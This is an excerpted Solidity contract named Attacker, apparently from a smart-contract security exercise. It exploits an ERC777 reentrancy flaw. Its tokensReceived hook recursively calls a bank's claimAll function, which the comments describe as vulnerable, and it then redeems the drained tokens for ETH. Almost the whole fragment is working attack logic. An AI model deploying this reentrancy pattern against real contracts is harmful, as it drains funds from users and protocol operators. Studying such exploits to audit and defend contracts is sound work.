...
contract Attacker is AccessControl, IERC777Recipient {
	...
	*/
	function attack(uint256 amt) payable public {
      require( address(bank) != address(0), "Target bank not set" );
		require(msg.value == amt, "Must send the exact amount");
	...
	*/
	function tokensReceived(
		...
		// Recurse into the vulnerable claimAll while our balance is still non-zero.
		if (depth < max_depth) {
			emit Recurse(depth);
			depth += 1;
			bank.claimAll();
		...
		// After recursion, redeem only what the bank can currently pay.
		if (depth == 0) {
			ERC777 token = bank.token();
			uint256 redeemable = token.balanceOf(address(this));
			uint256 bankEth = address(bank).balance;
			if (redeemable > bankEth) {
				redeemable = bankEth;
			}
			if (redeemable > 0) {
				bank.redeem(redeemable);
			}
		}
	}

	// Accept ETH sent during redeem callbacks
